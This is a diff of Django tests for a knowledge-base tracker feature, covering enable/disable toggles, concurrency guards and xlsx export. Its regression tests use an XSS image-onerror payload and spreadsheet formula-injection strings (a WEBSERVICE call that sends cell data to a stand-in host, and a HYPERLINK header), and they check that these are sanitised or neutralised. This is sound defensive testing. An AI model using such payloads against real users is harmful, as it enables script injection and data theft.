@@ -111,22 +111,38 @@ class TrackerViewTests(TestCase):
             name="视图库", slug="trk-view-lib", created_by=self.user)
         self.url = reverse("kb:tracker", args=["trk-view-lib"])
 
-    def test_page_renders_config_and_rows(self):
+    def test_disabled_by_default_enable_then_edit(self):
+        """默认关闭：页面只有说明+启用按钮；启用后才出现字段编辑等功能。"""
         self.client.force_login(self.user)
         r = self.client.get(self.url)
         self.assertEqual(r.status_code, 200)
-        self.assertContains(r, "追踪字段")
-        self.assertContains(r, "补录已有文档")
-        # 配置保存（AJAX）
-        r2 = self.client.post(self.url, {
-            "action": "config_save", "enabled": "on",
+        self.assertContains(r, "id=\"trkEnable\"")
+        self.assertNotContains(r, "同构工作流")  # 说明文案已删
+        self.assertNotContains(r, "fields_text")  # 配置表单不渲染
+        self.assertNotContains(r, 'id="trkBackfill"')
+        # 启用（AJAX）→ 配置出现并可保存
+        r1 = self.client.post(self.url, {"action": "enable"},
+                              HTTP_X_REQUESTED_WITH="XMLHttpRequest")
+        self.assertTrue(r1.json()["ok"])
+        self.assertTrue(KbTracker.objects.get(kb=self.kb).enabled)
+        r2 = self.client.get(self.url)
+        self.assertContains(r2, "追踪字段")
+        self.assertContains(r2, "补录已有文档")
+        r3 = self.client.post(self.url, {
+            "action": "config_save",
             "fields_text": "设备编号\n检验日期\n\n设备编号",  # 空行跳过 + 去重
             "instruction": "结论只填 合格/不合格",
         }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
-        self.assertTrue(r2.json()["ok"])
-        tr = self.kb.tracker
+        self.assertTrue(r3.json()["ok"])
+        tr = KbTracker.objects.get(kb=self.kb)  # 显式重查（跳过缓存的关系对象）
         self.assertTrue(tr.enabled)
         self.assertEqual([f["label"] for f in tr.fields], ["设备编号", "检验日期"])
+        # 停用：配置隐藏、已启用状态文案消失
+        self.client.post(self.url, {"action": "disable"},
+                         HTTP_X_REQUESTED_WITH="XMLHttpRequest")
+        r4 = self.client.get(self.url)
+        self.assertFalse(KbTracker.objects.get(kb=self.kb).enabled)
+        self.assertNotContains(r4, "fields_text")
 
     def test_permission_required(self):
         other = get_user_model().objects.create_user(username="trk-noob", password="pw")
@@ -278,7 +294,7 @@ class TrackerConfirmFlowTests(TestCase):
         self.client.force_login(self.user)
         # 配置新增一个字段
         self.client.post(reverse("kb:tracker", args=["trk-cf-lib"]), {
-            "action": "config_save", "enabled": "on",
+            "action": "config_save",
             "fields_text": "设备编号\n结论\n下次检验日期", "instruction": "",
         }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
         self.tr.refresh_from_db()
@@ -290,7 +306,7 @@ class TrackerConfirmFlowTests(TestCase):
         self.assertContains(page, "字段已变更")
         # 仅改 instruction 不动字段 → 版本不变
         self.client.post(reverse("kb:tracker", args=["trk-cf-lib"]), {
-            "action": "config_save", "enabled": "on",
+            "action": "config_save",
             "fields_text": "设备编号\n结论\n下次检验日期",
             "instruction": "新提示",
         }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
@@ -306,3 +322,283 @@ class TrackerConfirmFlowTests(TestCase):
             n = backfill_async(self.tr)
         self.assertEqual(n, 0)  # 唯一已完成文档已有待确认行 → 不排
         m.assert_not_called()
+
+
+class KbEditDialogTrackerToggleTests(TestCase):
+    """编辑知识库弹窗：tracker_enabled 勾选 ↔ 库的追踪表启停（kb_rename 可选字段）。"""
+
+    def setUp(self):
+        self.user = get_user_model().objects.create_user(
+            username="trk-tgl", password="pw", is_staff=True)
+        self.kb = KnowledgeBase.objects.create(
+            name="开关库", slug="trk-tgl-lib", created_by=self.user)
+
+    def test_toggle_via_kb_rename(self):
+        url = reverse("kb:kb_rename", args=["trk-tgl-lib"])
+        self.client.force_login(self.user)
+        # 勾选 → 启用（tracker 不存在则创建）
+        r = self.client.post(url, {"name": "开关库", "tracker_present": "1",
+                                   "tracker_enabled": "on"},
+                             HTTP_X_REQUESTED_WITH="XMLHttpRequest")
+        self.assertTrue(r.json()["ok"])
+        self.assertTrue(KbTracker.objects.get(kb=self.kb).enabled)
+        # 取消勾选（checkbox 不发包，仅标记字段）→ 停用
+        r2 = self.client.post(url, {"name": "开关库", "tracker_present": "1"},
+                              HTTP_X_REQUESTED_WITH="XMLHttpRequest")
+        self.assertTrue(r2.json()["ok"])
+        self.assertFalse(KbTracker.objects.get(kb=self.kb).enabled)
+        # 不带标记（列表页改名弹窗）→ 不动追踪表
+        KbTracker.objects.filter(kb=self.kb).update(enabled=True)
+        r3 = self.client.post(url, {"name": "开关库改名"},
+                              HTTP_X_REQUESTED_WITH="XMLHttpRequest")
+        self.assertTrue(r3.json()["ok"])
+        self.assertTrue(KbTracker.objects.get(kb=self.kb).enabled)
+
+    def test_dialog_has_toggle_and_short_label(self):
+        self.client.force_login(self.user)
+        r = self.client.get(reverse("kb:manage_detail", args=["trk-tgl-lib"]))
+        self.assertContains(r, 'name="tracker_enabled"')
+        self.assertContains(r, '描述（可选）</label>')
+        self.assertNotContains(r, "给 AI 选库用的内容说明")
+        # 未启用 → 顶部不显示「追踪表」入口；启用后显示
+        self.assertNotContains(r, 'id="trkEntry"')
+        KbTracker.objects.create(kb=self.kb, enabled=True, fields=[{"label": "x"}])
+        r2 = self.client.get(reverse("kb:manage_detail", args=["trk-tgl-lib"]))
+        self.assertContains(r2, 'id="trkEntry"')
+
+
+class ReviewFixTests(TestCase):
+    """代码审查修复回归：并发竞态 / XSS sanitize / 公式注入 / 回收 / 守卫。"""
+
+    def setUp(self):
+        self.user = get_user_model().objects.create_user(
+            username="fix-admin", password="pw", is_staff=True)
+        self.kb = KnowledgeBase.objects.create(
+            name="修复库", slug="fix-lib", created_by=self.user)
+        self.tr = KbTracker.objects.create(
+            kb=self.kb, enabled=True, fields=[{"label": "结论"}])
+        self.doc = Document.objects.create(
+            kb=self.kb, original_name="修复.pdf", file="documents/x.pdf",
+            file_type="pdf", status="completed", md_content="内容")
+        self.url = reverse("kb:tracker", args=["fix-lib"])
+
+    def _row(self, **kw):
+        return TrackerRow.objects.create(tracker=self.tr, document=self.doc, **kw)
+
+    def test_retry_rejected_while_running(self):
+        row = self._row(status="running")
+        self.client.force_login(self.user)
+        with patch("kb.tracker.run_extraction_async") as m:
+            r = self.client.post(self.url, {"action": "row_retry", "row_id": row.id},
+                                 HTTP_X_REQUESTED_WITH="XMLHttpRequest")
+        data = r.json()
+        self.assertFalse(data["ok"])
+        self.assertIn("抽取中", data["message"])
+        m.assert_not_called()
+        row.refresh_from_db()
+        self.assertEqual(row.status, "running")  # 未被重置
+
+    def test_terminal_write_loses_to_concurrent_winner(self):
+        """LLM 调用期间行被他人写终态 → 本次写入放弃（CAS）。"""
+        row = self._row(status="pending")  # 认领即置 running；竞态发生在 LLM 调用期间
+
+        def racing_llm(prompt):
+            # 模拟并发赢家：LLM 慢调用期间把行写成 done
+            TrackerRow.objects.filter(id=row.id).update(
+                status="done", values={"结论": "赢家"})
+            return '{"结论": "输家"}'
+
+        with patch("kb.tracker._llm_invoke", racing_llm):
+            ok = run_extraction(self.doc.id, tracker_id=self.tr.id)
+        self.assertFalse(ok)  # CAS 失败返回 False
+        row.refresh_from_db()
+        self.assertEqual(row.values, {"结论": "赢家"})  # 赢家结果未被覆盖
+
+    def test_row_confirm_rejects_when_no_longer_proposed(self):
+        row = self._row(status="proposed",
+                        values={"结论": "旧"}, proposed_values={"结论": "新"})
+        self.client.force_login(self.user)
+        # 确认前行被重试改成 pending
+        row.status = "pending"
+        row.save(update_fields=["status"])
+        r = self.client.post(self.url, {
+            "action": "row_confirm", "row_id": row.id,
+            "choices": '{"结论": "new"}',
+        }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
+        self.assertFalse(r.json()["ok"])
+        row.refresh_from_db()
+        self.assertEqual(row.values, {"结论": "旧"})  # 未被覆盖
+
+    def test_field_labels_sanitized(self):
+        self.client.force_login(self.user)
+        r = self.client.post(self.url, {
+            "action": "config_save",
+            "fields_text": "<img src=x onerror=alert(1)>\n正常字段",
+        }, HTTP_X_REQUESTED_WITH="XMLHttpRequest")
+        self.assertTrue(r.json()["ok"])
+        labels = [f["label"] for f in self.tr.refresh_from_db() or self.tr.fields]
+        self.assertEqual(labels, ["img src=x onerror=alert(1)", "正常字段"])
+        self.assertNotIn("<", "".join(labels))
+
+    def test_xlsx_formula_injection_neutralized(self):
+        row = self._row(status="done", values={"结论": '=WEBSERVICE("http://x/?"&A1)'})
+        self.client.force_login(self.user)
+        r = self.client.get(self.url + "?xlsx=1")
+        import io
+        from openpyxl import load_workbook
+        wb = load_workbook(io.BytesIO(r.content))
+        cell = wb.active.cell(row=2, column=2)
+        self.assertEqual(cell.data_type, "s")  # 文本而非公式
+        self.assertTrue(str(cell.value).startswith("'="))
+
+    def test_backfill_guard_requires_enabled_and_fields(self):
+        self.tr.enabled = False
+        self.tr.save()
+        self.client.force_login(self.user)
+        r = self.client.post(self.url, {"action": "backfill"},
+                             HTTP_X_REQUESTED_WITH="XMLHttpRequest")
+        self.assertFalse(r.json()["ok"])
+
+    def test_stale_running_row_reaped_on_page_view(self):
+        from datetime import timedelta
+        from django.utils import timezone
+        row = self._row(status="running")
+        TrackerRow.objects.filter(id=row.id).update(
+            updated_at=timezone.now() - timedelta(minutes=30))
+        self.client.force_login(self.user)
+        self.client.get(self.url)
+        row.refresh_from_db()
+        self.assertEqual(row.status, "failed")
+        self.assertIn("中断", row.error)
+
+    def test_backfill_skips_docs_of_child_with_own_tracker(self):
+        folder = KnowledgeBase.objects.create(
+            name="文件夹", slug="fix-folder", is_folder=True, created_by=self.user)
+        child = KnowledgeBase.objects.create(
+            name="子库", slug="fix-child", parent=folder, created_by=self.user)
+        KbTracker.objects.create(kb=child, enabled=True, fields=[{"label": "x"}])
+        Document.objects.create(kb=child, original_name="子库文档.pdf",
+                                file="documents/y.pdf", file_type="pdf",
+                                status="completed", md_content="x")
+        folder_tr = KbTracker.objects.create(
+            kb=folder, enabled=True, fields=[{"label": "y"}])
+        from kb.tracker import backfill_async
+        with patch("kb.tracker.run_extraction") as m:
+            n = backfill_async(folder_tr)
+        self.assertEqual(n, 0)  # 子库自带 tracker → 不归文件夹表管
+        m.assert_not_called()
+
+
+class SecondRoundFixTests(TestCase):
+    """复审修复：表头公式注入 + 认领刷新 updated_at（补录旧失败行不被回收误杀）。"""
+
+    def setUp(self):
+        self.user = get_user_model().objects.create_user(
+            username="fix2-admin", password="pw", is_staff=True)
+        self.kb = KnowledgeBase.objects.create(
+            name="复审库", slug="fix2-lib", created_by=self.user)
+        self.tr = KbTracker.objects.create(
+            kb=self.kb, enabled=True, fields=[{"label": "=HYPERLINK(\"http://x\",\"险\")"}])
+        self.doc = Document.objects.create(
+            kb=self.kb, original_name="复审.pdf", file="documents/x.pdf",
+            file_type="pdf", status="completed", md_content="内容")
+        self.url = reverse("kb:tracker", args=["fix2-lib"])
+
+    def test_header_formula_injection_neutralized(self):
+        TrackerRow.objects.create(
+            tracker=self.tr, document=self.doc, status="done",
+            values={self.tr.fields[0]["label"]: "ok"})
+        self.client.force_login(self.user)
+        r = self.client.get(self.url + "?xlsx=1")
+        import io
+        from openpyxl import load_workbook
+        wb = load_workbook(io.BytesIO(r.content))
+        header = wb.active.cell(row=1, column=2)
+        self.assertEqual(header.data_type, "s")  # 表头也是文本而非公式
+        self.assertTrue(str(header.value).startswith("'="))
+
+    def test_claim_refreshes_updated_at_so_reap_spares_backfill(self):
+        """补录翻出的旧失败行：认领即刷新 updated_at，页面 GET 的 20 分钟
+        回收不应误杀进行中的抽取（复审 P1 的实证回归）。"""
+        from datetime import timedelta
+        from django.utils import timezone
+        row = TrackerRow.objects.create(
+            tracker=self.tr, document=self.doc, status="failed", error="旧错")
+        TrackerRow.objects.filter(id=row.id).update(
+            updated_at=timezone.now() - timedelta(days=3))  # 三天前的失败行
+        self.tr.fields = [{"label": "结论"}]
+        self.tr.save()
+        self.client.force_login(self.user)
+
+        def llm_with_page_view(prompt):
+            # LLM 慢调用期间有人打开了追踪表页（触发回收逻辑）
+            self.client.get(self.url)
+            return '{"结论": "合格"}'
+
+        with patch("kb.tracker._llm_invoke", llm_with_page_view):
+            ok = run_extraction(self.doc.id)
+        self.assertTrue(ok)
+        row.refresh_from_db()
+        self.assertEqual(row.status, "done")     # 没被回收标成 failed
+        self.assertEqual(row.values, {"结论": "合格"})
+
+
+class ShadowingSemanticsTests(TestCase):
+    """遮蔽语义：子库 tracker 仅「启用且已配置字段」时接管，停用不遮蔽。"""
+
+    def setUp(self):
+        self.user = get_user_model().objects.create_user(
+            username="shadow-admin", password="pw", is_staff=True)
+        self.folder = KnowledgeBase.objects.create(
+            name="文件夹", slug="shadow-folder", is_folder=True, created_by=self.user)
+        self.child = KnowledgeBase.objects.create(
+            name="子库", slug="shadow-child", parent=self.folder, created_by=self.user)
+        self.doc = Document.objects.create(
+            kb=self.child, original_name="子库文档.pdf", file="documents/x.pdf",
+            file_type="pdf", status="completed", md_content="内容")
+
+    def _folder_tr(self):
+        return KbTracker.objects.create(
+            kb=self.folder, enabled=True, fields=[{"label": "结论"}])
+
+    def test_disabled_child_tracker_does_not_shadow(self):
+        """子库 tracker 停用 → 父文件夹表照常覆盖（钩子与补录一致）。"""
+        KbTracker.objects.create(kb=self.child, enabled=False, fields=[{"label": "x"}])
+        tr = self._folder_tr()
+        # 自动钩子路径：解析到父表
+        with patch("kb.tracker._llm_invoke", _fake_llm('{"结论": "合格"}')):
+            self.assertTrue(run_extraction(self.doc.id))
+        row = TrackerRow.objects.get(tracker=tr, document=self.doc)
+        self.assertEqual(row.values, {"结论": "合格"})
+        # 补录路径：翻出子库其它文档也不被停用的子表挡住
+        from kb.tracker import backfill_async
+        with patch("kb.tracker.run_extraction") as m:
+            n = backfill_async(tr)
+        self.assertEqual(n, 0)  # 该文档刚已登记 done → 无待补
+        m.assert_not_called()
+
+    def test_enabled_child_tracker_shadows_for_hook_and_backfill(self):
+        """子表启用且有字段 → 钩子写进子表（父表不覆盖），父表补录也跳过。"""
+        child_tr = KbTracker.objects.create(
+            kb=self.child, enabled=True, fields=[{"label": "x"}])
+        tr = self._folder_tr()
+        with patch("kb.tracker._llm_invoke", _fake_llm('{"x": "子表值"}')):
+            self.assertTrue(run_extraction(self.doc.id))
+        # 行落在子表，父表没有该文档的行
+        self.assertTrue(TrackerRow.objects.filter(
+            tracker=child_tr, document=self.doc).exists())
+        self.assertFalse(TrackerRow.objects.filter(
+            tracker=tr, document=self.doc).exists())
+        from kb.tracker import backfill_async
+        with patch("kb.tracker.run_extraction") as m2:
+            self.assertEqual(backfill_async(tr), 0)  # 父表补录不越权接管
+            m2.assert_not_called()
+
+    def test_enabled_but_fieldless_child_tracker_does_not_shadow(self):
+        """启用但没配字段的子表同样不遮蔽（与钩子的 fields 校验一致）。"""
+        KbTracker.objects.create(kb=self.child, enabled=True, fields=[])
+        tr = self._folder_tr()
+        with patch("kb.tracker._llm_invoke", _fake_llm('{"结论": "合格"}')):
+            self.assertTrue(run_extraction(self.doc.id))
+        self.assertEqual(TrackerRow.objects.get(tracker=tr).values,
+                         {"结论": "合格"})
